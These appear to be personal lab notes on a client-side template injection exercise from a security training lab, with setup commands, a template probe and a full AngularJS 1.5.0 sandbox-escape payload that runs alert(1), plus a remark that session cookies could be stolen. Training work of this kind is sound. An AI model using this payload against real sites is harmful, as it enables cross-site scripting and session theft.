# CSTI
```bash
git clone https://github.com/blabla1337/skf-labs

cd skf-labs/python/CSTI

pip3 install -r requirements.txt
sudo python3 CSTI.py

{{3*3}}

https://book.hacktricks.wiki/en/index.html
# angularjs 1.5.0

https://techbrunch.github.io/patt-mkdocs/XSS%20Injection/XSS%20in%20Angular/

# paste into form
{{
    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
    c.$apply=$apply;c.$eval=b;op=$root.$$phase;
    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
    B=C(b,c,b);$evalAsync("
    astNode=pop();astNode.type='UnaryExpression';
    astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';
    astNode.argument={type:'Identifier',name:'foo'};
    ");
    m1=B($$asyncQueue.pop().expression,null,$root);
    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
    $eval('a(b.c)');[].push.apply=a;
}}

# should pop up an alert
# we can obtain cookie session, but is difficult



```